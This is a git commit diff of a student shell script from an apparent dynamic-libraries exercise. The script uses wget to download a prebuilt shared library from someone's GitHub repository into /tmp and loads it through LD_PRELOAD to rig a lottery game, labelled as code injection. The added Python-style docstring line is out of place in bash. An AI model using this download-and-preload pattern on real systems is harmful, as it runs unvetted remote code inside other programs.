c179676c0624aa0d64a305bcc4e362ad31269a13
userfiona <fionaramaesela@gmail.com>
2023-06-19 09:36:16 -0700

    copy

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
+"""Code injection: Win the Giga Millions!"""
 wget -P /tmp/ https://raw.github.com/Aysuarex/alx-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
 export LD_PRELOAD=/tmp/nrandom.so
